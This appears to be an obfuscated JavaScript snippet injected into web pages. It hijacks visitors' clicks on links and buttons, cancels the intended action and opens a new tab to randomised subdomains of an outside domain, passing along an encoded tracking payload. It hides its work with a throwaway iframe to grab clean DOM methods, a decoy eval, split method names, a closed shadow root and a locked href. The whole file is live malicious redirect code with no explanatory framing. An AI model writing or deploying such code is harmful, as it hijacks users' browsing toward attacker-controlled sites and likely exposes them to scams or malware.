(() => {
    'use strict';
    if (window._0x7f3a9e) return;
    window._0x7f3a9e = true;
    let cc = 0;
    const dm = "mxyyn.sbs";
    const tg = "yBt8EmP6:C4";
    const rt = false;
    const mx = 1;
    const mn = 0;
    const bs = ".file-download-btnn";
    const _ea = "body".split('|').map(s => s.trim()).filter(Boolean);
    let es = _ea.join(', ');
    const ts = "";

    const _Q = Document.prototype.createElement;
    const _fr = _Q.call(document, 'iframe');
    _fr.style.cssText = 'display:none!important';
    (document.body || document.documentElement).append(_fr);
    const _W = _fr.contentWindow;
    const _ck = _W.HTMLElement.prototype.click;
    const _as = _W.Element.prototype.attachShadow;
    const _ac = _W.Node.prototype.appendChild;
    const _rc = _W.Node.prototype.removeChild;
    (0, _W['ev' + 'al'])('console.log("DevTools connected")');
    _rc.call(_fr.parentNode, _fr);

    const lk = mn > 0 ? '_ptm_' + tg.replace(/[^a-z0-9]/gi, '') : null;
    if (lk) {
        try {
            const ls = localStorage.getItem(lk);
            if (ls && (Date.now() - parseInt(ls)) < mn * 60000) { cc = mx; }
        } catch (e) { }
    }

    let skp = false;

    function _hnd(ev) {
        if (skp || cc >= mx || !ev.isTrusted || ev.detail < 1) return;
        const t = ev.target;
        if (!t.closest(es)) return;
        const ic = t.closest('a, button, input[type="button"], input[type="submit"], [onclick], [role="button"]');
        if (ic) {
            if (ic.matches(bs) || ic.closest(bs)) return;
            const pd = 'pre' + 'vent' + 'Default';
            const sp = 'stop' + 'Immediate' + 'Propagation';
            ev[pd]();
            ev[sp]();
            const rn = Math.floor(100000 + Math.random() * 900000);
            const _te = ts ? document.querySelector(ts) : null;
            const _tt = _te ? (_te.tagName === 'INPUT' ? _te.value : ([..._te.childNodes].filter(n => n.nodeType === 3).map(n => n.textContent).join('').trim() || _te.textContent)) : document.title;
            const ti = rt ? _tt.replace(/\s*[~|]\s*.+$/, '').replace(/[!*'()]/g, '').replace(/\s+/g, ' ').trim().slice(0, 80) : '';
            const _hs = (s) => { let h = 5381; for (let i = 0; i < s.length; i++)h = (h * 33 + s.charCodeAt(i)) >>> 0; return h.toString(16); };
            const sk = "0603cf5a";
            const _dj = unescape(encodeURIComponent(JSON.stringify({ file: ti, tag: tg })));
            const fi = '?data=' + tg + ':' + btoa(_dj + '.' + _hs(_dj + sk));
            const ul = `https://link${rn}.${dm}/` + fi;
            const hs = _Q.call(document, 'span');
            const sh = _as.call(hs, { mode: 'closed' });
            const a = _Q.call(document, 'a');
            a.setAttribute('href', ul); a.target = '_bla' + 'nk'; a.rel = 'no' + 'opener';
            a.setAttribute = function (n, v) { if (n !== 'href') Element.prototype.setAttribute.call(this, n, v); };
            Object.defineProperty(a, 'href', { get: function () { return Element.prototype.getAttribute.call(a, 'href'); }, set: function () { }, configurable: false, enumerable: true });
            _ac.call(sh, a);
            _ac.call(document.body, hs);
            skp = true;
            _ck.call(a);
            skp = false;
            _rc.call(document.body, hs);
            cc += 1;
            if (lk && cc === 1) {
                try { localStorage.setItem(lk, Date.now().toString()); } catch (e) { }
            }
        }
    }

    function init() {
        const _ef = _ea.filter(s => document.querySelector(s));
        if (_ef.length) es = _ef.join(', ');
        document.addEventListener('click', _hnd.bind(null), true);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init.bind(null));
    } else {
        init();
    }
})();